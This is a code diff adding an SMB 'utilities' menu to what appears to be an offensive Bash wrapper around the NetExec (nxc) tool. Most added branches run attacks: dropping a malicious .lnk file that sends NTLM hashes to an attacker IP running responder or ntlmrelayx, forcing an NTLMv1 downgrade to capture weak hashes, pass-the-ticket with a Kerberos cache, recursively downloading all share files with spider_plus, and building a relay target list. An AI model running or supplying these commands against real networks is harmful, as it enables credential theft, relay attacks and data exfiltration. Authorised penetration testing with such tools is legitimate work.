@@ -485,6 +485,74 @@ handle_smb_vulns() {
 }
 
 # ============================================================================
+# NXC/SMB Utilities - Generate files, modules, and advanced features
+# ============================================================================
+handle_nxc_utils() {
+    local auth target subchoice
+
+    target=$(get_target_for_command) || return 1
+    auth=$(build_auth)
+    subchoice=$(show_menu "nxc_utils" "Select Utility: ")
+
+    case "$subchoice" in
+        "Generate /etc/hosts File")
+            read -p "Output file path [default: ./hosts]: " output_file
+            [[ -z "$output_file" ]] && output_file="./hosts"
+            echo -e "${CYAN}Generating hosts file from target(s)...${NC}"
+            run_command "nxc smb $target --generate-hosts-file '$output_file'"
+            ;;
+        "Generate krb5.conf File")
+            read -p "Output file path [default: ./krb5.conf]: " output_file
+            [[ -z "$output_file" ]] && output_file="./krb5.conf"
+            echo -e "${CYAN}Generating krb5.conf file from target(s)...${NC}"
+            run_command "nxc smb $target --generate-krb5-file '$output_file'"
+            ;;
+        "Slinky Module (Create .lnk for Hash Capture)")
+            read -p "Share name to drop .lnk file [default: C$]: " share_name
+            [[ -z "$share_name" ]] && share_name="C\$"
+            read -p "Attacker IP (for hash capture): " attacker_ip
+            if [[ -z "$attacker_ip" ]]; then
+                echo -e "${RED}Attacker IP required!${NC}"
+                sleep 2
+                return 1
+            fi
+            read -p "LNK filename [default: IMPORTANT]: " lnk_name
+            [[ -z "$lnk_name" ]] && lnk_name="IMPORTANT"
+            echo -e "${CYAN}Dropping malicious .lnk file to capture hashes...${NC}"
+            echo -e "${YELLOW}Make sure responder/ntlmrelayx is running on $attacker_ip!${NC}"
+            run_command "nxc smb $target $auth -M slinky -o NAME='$lnk_name' SERVER='$attacker_ip' SHARE='$share_name'"
+            ;;
+        "Pass-the-Ticket (Use Kerberos Cache)")
+            echo -e "${CYAN}Using existing Kerberos ticket from KRB5CCNAME${NC}"
+            echo -e "${YELLOW}Make sure KRB5CCNAME is set: export KRB5CCNAME=/path/to/ticket.ccache${NC}"
+            run_command "nxc smb $target --use-kcache"
+            ;;
+        "Kerberos Authentication (-k)")
+            echo -e "${CYAN}Using Kerberos authentication with provided credentials${NC}"
+            run_command "nxc smb $target $auth -k"
+            ;;
+        "Spider Plus Module (Enhanced)")
+            echo -e "${CYAN}Running spider_plus module for recursive file enumeration${NC}"
+            read -p "Download all files? [y/N]: " download_choice
+            if [[ "$download_choice" =~ ^[Yy]$ ]]; then
+                run_command "nxc smb $target $auth -M spider_plus -o DOWNLOAD_FLAG=True"
+            else
+                run_command "nxc smb $target $auth -M spider_plus"
+            fi
+            ;;
+        "NTLMv1 Downgrade (Capture Weak Hashes)")
+            echo -e "${CYAN}Attempting to downgrade to NTLMv1...${NC}"
+            echo -e "${YELLOW}Make sure responder is running with --lm flag!${NC}"
+            run_command "nxc smb $target $auth -M ntlmv1"
+            ;;
+        "Check SMB Signing")
+            echo -e "${CYAN}Checking SMB signing status...${NC}"
+            run_command "nxc smb $target --gen-relay-list relay_targets.txt"
+            ;;
+    esac
+}
+
+# ============================================================================
 # Main SMB Handler - Routes to appropriate sub-handler
 # ============================================================================
 handle_smb() {
@@ -524,3 +592,4 @@ export -f handle_smb_shares
 export -f handle_smb_exec
 export -f handle_smb_creds
 export -f handle_smb_vulns
+export -f handle_nxc_utils
